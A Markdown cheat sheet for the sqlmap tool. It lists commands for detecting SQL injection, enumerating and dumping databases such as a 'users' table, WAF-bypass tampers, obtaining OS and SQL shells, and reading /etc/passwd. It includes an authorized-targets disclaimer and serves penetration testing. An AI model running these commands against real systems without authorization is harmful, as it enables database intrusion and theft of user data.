---
name: sqlmap
category: Web & Fuzzing
description: Automated detection and exploitation of SQL injection, plus DB extraction.
tags: [sqli, injection, database, dump, web, exploit]
---

# sqlmap

**sqlmap** automates the detection and exploitation of SQL injection flaws and the takeover of database servers. It fingerprints the DBMS, enumerates schemas, dumps data and can even get a shell.

> `apt install sqlmap` · [sqlmap.org](https://sqlmap.org) · only against targets you're authorized to test

## Basic detection

```bash
sqlmap -u 'https://alvo/page?id=1'                     # test the id parameter
sqlmap -u 'https://alvo/page?id=1' -p id               # target a specific param
sqlmap -u 'https://alvo/page?id=1' --batch             # non-interactive (defaults)
```

## From a captured request

```bash
sqlmap -r request.txt                     # request saved from Burp (best for POST/headers/cookies)
sqlmap -r request.txt -p username
```

## POST / cookies / headers

```bash
sqlmap -u https://alvo/login --data='user=admin&pass=1'
sqlmap -u https://alvo/ --cookie='PHPSESSID=abc; auth=1'
sqlmap -u https://alvo/ --headers='X-Forwarded-For: 1*'   # * marks injection point
```

## Enumeration

```bash
sqlmap -r req.txt --dbs                     # list databases
sqlmap -r req.txt -D loja --tables          # tables of a DB
sqlmap -r req.txt -D loja -T users --columns
sqlmap -r req.txt -D loja -T users --dump   # dump the table
sqlmap -r req.txt --dump-all                # everything (careful/noisy)
sqlmap -r req.txt --current-user --current-db --is-dba
```

## Tuning: level & risk

```bash
sqlmap -r req.txt --level=5 --risk=3        # deeper tests (more payloads)
sqlmap -r req.txt --technique=BEUSTQ        # Boolean/Error/Union/Stacked/Time/inline
sqlmap -r req.txt --dbms=mysql              # skip fingerprinting
```

## Evasion & shells

```bash
sqlmap -r req.txt --tamper=space2comment,between   # WAF bypass tampers
sqlmap -r req.txt --random-agent --delay=1 --proxy=http://127.0.0.1:8080
sqlmap -r req.txt --os-shell                 # OS shell (if permissions allow)
sqlmap -r req.txt --sql-shell                # interactive SQL prompt
sqlmap -r req.txt --file-read=/etc/passwd
```

> Feeding a **saved Burp request** (`-r`) is the most reliable path — it carries cookies, headers and POST data. `--level`/`--risk` trade speed for coverage. Extraction is intrusive: stay within scope and prefer `--dump` of specific tables over `--dump-all`.
